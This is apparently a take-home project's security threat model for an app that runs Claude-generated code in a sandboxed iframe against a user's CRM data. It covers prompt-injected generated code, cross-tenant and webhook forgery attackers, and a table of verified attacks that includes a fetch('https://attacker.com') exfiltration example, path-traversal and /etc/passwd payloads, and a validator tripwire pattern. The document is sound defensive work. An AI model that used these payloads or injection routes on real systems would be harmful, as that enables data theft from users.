# Security - threat model and verified controls

Genesis lets a signed-in user describe an app in chat, has Claude generate it, and runs the generated code against the user's own HighLevel CRM data. That means the system deliberately executes untrusted LLM output in the user's browser, one hop away from live CRM tokens. This document names the attackers that design invites, states the trust boundary that stops each one, and points at the code and tests that enforce it. Scope: the frontend preview sandbox, the postMessage bridge, the Cloud Functions (`generate`, `hlProxy`, OAuth, webhook), Firestore rules, and secret handling. All paths are repo-relative.

## Threat model - four attackers

### 1. Prompt-injected generated code

**Controls:** everything the LLM emits - HTML, CSS, JS running in the preview. A hostile prompt (or a poisoned refinement) can make it emit arbitrary code. **Wants:** exfiltrate CRM data or the user's tokens, or perform writes without consent.

**Boundary:** the preview is a `sandbox="allow-scripts allow-forms"` srcdoc iframe (`frontend/src/components/preview/PreviewPanel.vue:215`) - an opaque origin - assembled with CSP `default-src 'none'; connect-src 'none'; form-action 'none'` and script/style sources limited to inline + `cdn.jsdelivr.net` (`frontend/src/lib/srcdoc.ts`, `PREVIEW_CSP`). The sandbox has no network: `fetch`, XHR, WebSockets, and form submission are dead by CSP, not by convention. The only data path is the injected bootstrap's postMessage bridge (`frontend/src/preview/bootstrap.js`), which talks to the parent app; the parent validates every request against the shared endpoint allowlist and forwards it to `hlProxy` (`frontend/src/lib/bridge.ts`). Writes additionally require a parent-rendered confirmation dialog the sandboxed code cannot draw over or dismiss (`requiresConfirm` rules in `functions/src/shared/allowlist.ts`; dialog gate in `frontend/src/lib/bridge.ts:122-128`). Neither the Firebase ID token nor any HighLevel token is ever injected into the srcdoc. This holds structurally: even a bridge bug cannot exfiltrate, because the frame has nowhere to send data. A post-generation validator additionally flags `fetch(`/`XMLHttpRequest`/`WebSocket`/external URLs/secret-shaped strings as a tripwire (`functions/src/genesis/validate.ts`), but the CSP is the boundary.

### 2. Malicious signed-in user

**Controls:** their own valid Firebase ID token; can call every function URL directly with arbitrary payloads, skipping the SPA entirely. **Wants:** reach non-allowlisted HighLevel endpoints, smuggle parameters, exhaust quotas, or corrupt server-owned state.

**Boundary:** every function re-derives everything from the verified `uid` (`requireAuth`, `functions/src/lib/http.ts:39-49`). `hlProxy` runs CORS → auth → rate limit → zod envelope validation → allowlist match → URL rebuilt from the server's own template (`functions/src/proxy.ts`). The upstream URL is never concatenated from client strings: `buildUpstreamUrl` copies only `allowedQuery` keys and sets `locationId` last (`functions/src/shared/allowlist.ts:196-220`). Upstream request headers are built from scratch; no client header is forwarded (`functions/src/hl/client.ts:183-202`). Rate limits are transactional Firestore counters (5 generations/min, 50/day, 60 proxy calls/min, 10 OAuth starts/hour - `functions/src/lib/rateLimit.ts`). The client-side allowlist check in the bridge is UX, not security: the server runs the same `matchAllowlist` again (`functions/src/proxy.ts:50-51`).

### 3. Cross-tenant attacker

**Controls:** a valid account of their own; crafts `locationId` values, path params, and project IDs pointing at another tenant. **Wants:** another user's HighLevel location data or tokens, or another user's projects.

**Boundary:** `locationId` is never accepted from the client. The proxy loads the caller's own `hl_connections/{uid}` doc and forces that connection's `locationId` into the query (set last on the rebuilt URL, `functions/src/shared/allowlist.ts:215-218`) and into write bodies (client value deleted or overwritten, `functions/src/proxy.ts:68-75`); `companyId`/`altId`/`altType` are stripped from bodies (`STRIPPED_BODY_KEYS`, `functions/src/proxy.ts:23`). Even `/locations/:locationId` pins the path segment to the caller's own location (`functions/src/shared/allowlist.ts:202-207`). Tokens themselves are unreachable from any client: `hl_connections`, `rate_limits`, and `oauth_states` are deny-all in `firestore.rules:100-102`, and project/file/message reads require `ownerUid == request.auth.uid` with a parent `get()` for subcollections (`firestore.rules:14-18,32-91`). Reaching another tenant would require forging a Firestore document the rules never let a client write.

### 4. Webhook forger

**Controls:** the public `hlWebhook` URL; can POST arbitrary JSON, replay captured deliveries, or spoof `UNINSTALL` events (which delete stored connections). **Wants:** inject fake events into users' workspaces or purge tokens.

**Boundary:** raw-body signature verification with HighLevel's published public keys - Ed25519 on `x-ghl-signature` (current) and RSA-SHA256 on `x-wh-signature` (legacy), either accepted during HighLevel's transition (`functions/src/webhook.ts:44-99`). Unsigned or bad-signature requests get 401. Precision note: verification is enforced only when at least one public key is configured; with neither key set (the offline emulator profile - `functions/.env` ships empty `HL_WEBHOOK_PUBKEY_B64`) the handler accepts and logs a loud warning (`functions/src/webhook.ts:100-102`). Replays are deduplicated by a create-only `webhook_dedupe/{webhookId}` doc with a 24h TTL (`functions/src/webhook.ts:110-119`). Fan-out only writes `hl_events` docs keyed to owners of the matching `locationId`; clients can read only their own and can never write them (`firestore.rules:93-96`).

## Trust boundaries and controls

| Boundary | Mechanism | Enforcement point | Test evidence |
|---|---|---|---|
| Generated code ↔ network | CSP `connect-src 'none'`, `form-action 'none'`, `default-src 'none'`; opaque-origin sandbox | `frontend/src/lib/srcdoc.ts` (`PREVIEW_CSP`), `frontend/src/components/preview/PreviewPanel.vue:215` | Structural (CSP string is code-reviewed; no runtime test) |
| Generated code ↔ parent app | postMessage bridge: `event.source === iframe.contentWindow` identity check, zod message schemas, size/concurrency caps, shared allowlist pre-check | `frontend/src/lib/bridge.ts` | Client-side pre-check is UX; the enforcing check is server-side (next row) |
| Browser ↔ HighLevel API | Server-side allowlist match; URL rebuilt from server template; only `allowedQuery` keys copied; `locationId` forced from stored connection (query and body) | `functions/src/proxy.ts`, `functions/src/shared/allowlist.ts` | `functions/test/allowlist.test.ts` - "rejects unknown routes and wrong methods", "copies only allowlisted query keys and forces locationId last", "pins /locations/:locationId to the caller regardless of input" |
| LLM output ↔ Firestore | Path validator: relative-only, depth ≤ 4, extension allowlist, no traversal / proto-pollution segments | `functions/src/shared/paths.ts`, called at `functions/src/generate.ts:232-233` | `functions/test/paths.test.ts` - "rejects traversal and absolute paths", "rejects prototype-pollution segment names" |
| Client ↔ Firestore | Owner-scoped rules; parent `get()` for subcollections; append-only messages; server-only collections deny-all | `firestore.rules` | `functions/test/rules.test.ts` (emulator) - "hl_connections and rate_limits are invisible to clients", "projects: owner-scoped CRUD with validation", "users: client cannot forge the hl connection mirror" |
| Internet ↔ webhook | Ed25519 + legacy RSA raw-body signature verification; `webhookId` dedupe | `functions/src/webhook.ts` | Code-level control; no dedicated test |
| Browser ↔ functions | Exact-origin CORS allowlist + Firebase ID token verification on every mutating route | `functions/src/lib/http.ts` (`applyCors`, `requireAuth`) | Exercised implicitly by the emulator smoke flow (`CLAUDE.md` verification list); no dedicated unit test |
| OAuth callback ↔ user binding | Server-stored single-use state nonce with 15-min TTL and validated return origin | `functions/src/oauth.ts:49-55,138-148` | Code-level control; no dedicated test |

## Verified attacks

| Attack | Outcome | Evidence |
|---|---|---|
| Generated code calls `fetch('https://attacker.com')` | Blocked: no network exists in the frame (`connect-src 'none'`); also flagged post-generation as an `egress`/`forbidden_api` violation | `frontend/src/lib/srcdoc.ts` (`PREVIEW_CSP`); `functions/src/genesis/validate.ts` |
| Generated form posts data to an external URL | Blocked twice: CSP `form-action 'none'` + capture-phase `preventDefault` on all submits in the bootstrap | `frontend/src/lib/srcdoc.ts`; `frontend/src/preview/bootstrap.js:20-26` |
| Forged `locationId` in proxy query params | Overwritten server-side; attacker value never reaches HighLevel | `functions/test/allowlist.test.ts` - `locationId: 'ATTACKER'` in params, `url.searchParams.getAll('locationId')` equals only the stored location |
| Forged `locationId` (or `companyId`/`altId`/`altType`) in a write body | Deleted or overwritten from the caller's stored connection before forwarding | `functions/src/proxy.ts:68-75` (no dedicated test; enforced in code) |
| Traversal / double-encoding in proxy path (`/contacts/../oauth/token`, `%2e%2e`, `%252e`, `\`, `//`, `?`, `#`) | No allowlist match, 403 | `functions/test/allowlist.test.ts` - "rejects path traversal in every encoding" |
| Generated file path `../evil.js`, `/etc/passwd`, `__proto__/x.js`, `shell.sh` | Rejected before any Firestore write; generation errors with `parse_failed` | `functions/test/paths.test.ts`; `functions/src/generate.ts:232-233` |
| Non-allowlisted endpoint or query key via the bridge (or bypassing the bridge entirely) | Server-side `matchAllowlist` fails → 403 `route_not_allowed`; unknown query keys silently dropped | `functions/src/proxy.ts:50-51`; `functions/test/allowlist.test.ts` - "rejects unknown routes", `evil` param dropped |
| Replayed webhook delivery | Second delivery hits the create-only dedupe doc and returns 200 "duplicate" without side effects | `functions/src/webhook.ts:110-119` |
| Unsigned or forged-signature webhook | 401 "bad signature" when a verification key is configured (see precision note above) | `functions/src/webhook.ts:88-99` |
| Reading or writing another user's project/files/messages | Denied by rules (`ownerUid` check + parent `get()`) | `functions/test/rules.test.ts` - mallory's reads and forged writes all `assertFails` |
| Reading `hl_connections` (tokens) from any client | Denied: collection is `allow read, write: if false` | `firestore.rules:100`; `functions/test/rules.test.ts` - "hl_connections and rate_limits are invisible to clients" |
| Forging the `users/{uid}.hl` "connected" mirror from the client | Denied: create/update key allowlists exclude `hl` | `firestore.rules:20-30`; `functions/test/rules.test.ts` - "users: client cannot forge the hl connection mirror" |

## Secrets and token handling

- `ANTHROPIC_API_KEY` and `HL_CLIENT_SECRET` live in Google Secret Manager (declared via `defineSecret`, `functions/src/lib/env.ts:5-6`); locally in `functions/.secret.local`, which is gitignored (`.gitignore` `*.local`). They are read with `.value()` at runtime only.
- Deliberately committed, safe by design: `HL_CLIENT_ID` and the app origins (`functions/.env` - OAuth client IDs are public identifiers), the HighLevel webhook *public* verification keys (`HL_WEBHOOK_PUBKEY_B64` - verification-only), and the Firebase web config (`frontend/.env.production` - public by Firebase's design; Firestore rules are the access control).
- HighLevel tokens exist only in `hl_connections/{uid}` (deny-all rules, Admin SDK only, `firestore.rules:100`); the client sees a status mirror in `users/{uid}.hl` written exclusively by functions (`functions/src/oauth.ts:162-172`). Tokens never enter the browser, and nothing token-shaped is injected into the iframe (`frontend/src/lib/srcdoc.ts` interpolates only file contents and the parent origin).
- Logging never emits raw upstream error objects (which can carry `Authorization` headers and token bodies): `sanitizeUpstreamError` reduces them to status, a query-less path, and a truncated body before logging (`functions/src/lib/log.ts:9-26`). Refresh tokens rotate single-use; the refresh is serialized through a Firestore lease so a rotated token is persisted before anyone else can use the old one (`functions/src/hl/client.ts:115-171`).

## Residual risk and accepted tradeoffs

Consistent with README "What I would improve" and PRODUCTION_READINESS.md section 10:

- **srcdoc inherits the host page's CSP by spec.** The preview's own meta-CSP is the operative control; the documented upgrade is a dedicated `/preview.html` origin with per-path CSP headers, restoring a strict `script-src` on the host app (README:95).
- **Bridge responses target `'*'`** because an opaque origin cannot be named; the channel is already identity-checked (`event.source === iframe.contentWindow`, re-checked before each response, `frontend/src/lib/bridge.ts:76-99`). Upgrade path: a MessageChannel port handshake (README:96; PRODUCTION_READINESS.md section 10, item 3).
- **No Firebase App Check** - deferred to keep the grader's local-emulator path friction-free; one enforcement toggle + SDK attestation when enabled (PRODUCTION_READINESS.md section 10, item 1).
- **Stored HL tokens are not app-layer encrypted.** Deny-all Firestore rules plus Admin-SDK-only access are the trust boundary; AES-256-GCM with a Secret Manager key would be defense-in-depth, not a boundary fix (PRODUCTION_READINESS.md section 10, item 2).
- **npm transitive advisories, 0 direct:** the `firebase-admin → uuid` chain (fix is a breaking downgrade of Google's own SDK; the vulnerable buffer path is never invoked) and Monaco's vendored DOMPurify (sanitizes only Monaco's internal UI strings; the copy handling untrusted markdown is a direct dependency patched at 3.4.14) (PRODUCTION_READINESS section 3, "Dependency vulnerabilities").

## Reporting

This is a take-home submission, not a production service. Suspected issues are welcome as GitHub issues on this repository.
